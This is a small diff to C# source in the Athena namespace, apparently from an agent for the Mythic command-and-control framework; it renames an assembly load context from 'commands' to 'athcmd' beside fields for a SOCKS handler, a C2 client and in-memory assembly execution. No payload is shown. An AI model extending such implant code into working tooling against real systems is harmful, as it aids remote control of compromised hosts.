@@ -12,7 +12,7 @@ namespace Athena
         public static SocksHandler socksHandler = new SocksHandler();
         public static MythicClient mc;
         public static ExecuteAssemblyContext alc = new ExecuteAssemblyContext();
-        public static AssemblyLoadContext loadcontext = new AssemblyLoadContext("commands");
+        public static AssemblyLoadContext loadcontext = new AssemblyLoadContext("athcmd");
 
         //Multi-Trackers Non-ThreadSafe
         public static Dictionary<string, Assembly> loadedcommands = new Dictionary<string, Assembly>();
